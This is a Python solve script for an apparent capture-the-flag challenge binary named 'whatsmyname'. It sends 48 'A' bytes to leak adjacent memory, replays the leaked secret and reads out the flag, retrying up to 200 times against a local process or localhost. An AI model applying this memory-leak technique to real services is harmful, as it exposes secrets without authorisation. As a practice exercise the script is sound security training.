#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./whatsmyname")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def attempt() -> bool:
    io = connect()
    io.send("A" * 48)
    io.recvuntil("A" * 48)
    secret = io.recv(47)
    print(secret)
    print(secret.hex())
    # input(">>")
    io.sendline(secret)
    # input(">>")

    try:
        io.recvuntil("actf", timeout=1)
        flag = b"actf" + io.recvuntil("}")
        print(flag.decode())
        io.close()
        return True
    except TimeoutError:
        print("bad luck")
        print(secret)
        io.close()
        return False


def main():
    for i in range(200):
        if attempt():
            break


if __name__ == "__main__":
    main()
